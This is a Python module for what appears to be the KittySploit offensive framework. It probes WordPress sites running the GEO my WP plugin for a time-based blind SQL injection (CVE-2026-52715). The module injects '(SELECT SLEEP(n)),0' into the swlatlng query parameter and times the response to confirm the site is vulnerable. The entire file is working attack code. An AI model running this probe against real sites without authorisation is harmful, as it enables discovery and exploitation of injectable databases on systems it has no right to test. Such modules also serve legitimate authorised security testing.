#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GEO my WP CVE-2026-52715 — time-based SQLi probe on map boundaries."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "GEO my WP CVE-2026-52715 SQLi probe",
        "description": "Runs configurable SLEEP in swlatlng for blind SQLi confirmation.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-52715"],
        "tags": ["wordpress", "geo-my-wp", "sqli", "cve-2026-52715"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    page_id = OptString("4", "Locator page_id", required=False)
    sleep_seconds = OptInteger(8, "SLEEP seconds", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        sleep_s = int(self.sleep_seconds or 8)
        start = time.monotonic()
        self.http_request(
            method="GET",
            path=self._join("/"),
            params={
                "page_id": self.page_id or "4",
                "swlatlng": f"(SELECT SLEEP({sleep_s})),0",
                "nelatlng": "1,1",
            },
            allow_redirects=True,
            timeout=30,
        )
        elapsed = time.monotonic() - start
        if elapsed >= sleep_s - 1:
            print_success(f"Delayed response ~{elapsed:.1f}s (SLEEP {sleep_s})")
            return True
        print_error(f"No delay ({elapsed:.1f}s)")
        return False
